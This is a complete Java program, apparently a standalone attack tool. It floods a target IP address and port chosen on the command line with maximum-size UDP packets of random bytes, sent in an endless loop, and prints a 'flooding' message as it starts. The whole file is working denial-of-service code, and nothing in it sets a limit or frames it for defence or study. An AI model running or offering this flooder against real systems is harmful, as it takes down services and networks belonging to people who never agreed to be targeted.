import java.io.*;
import java.net.*;
import java.security.*;

public class Udpflood { 
	public static void main(String[] args) {
		DatagramSocket socket = null;
		InetAddress address = null;
		byte[] buf = new byte[65507];
		SecureRandom random = new SecureRandom();

		if (args.length != 2) {
			System.err.println("Usage: IP PORT");
			System.exit(-1);
		}

		String ipAddr = args[0];
		int portDst = Integer.valueOf(args[1]);

		try {
			socket = new DatagramSocket();
		} catch (SocketException e) {
			e.printStackTrace();
		}

		try {
			address = InetAddress.getByName(ipAddr);
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}

		random.nextBytes(buf); 
		DatagramPacket packet = new DatagramPacket(buf, buf.length, address, portDst);

		try {
			System.out.printf("[*] Strat flooding %s:%d\n", ipAddr, portDst);
			while (true) {
				socket.send(packet);
			}
		} catch (IOException e) {
			e.printStackTrace();
		}

		socket.close();
	}
}
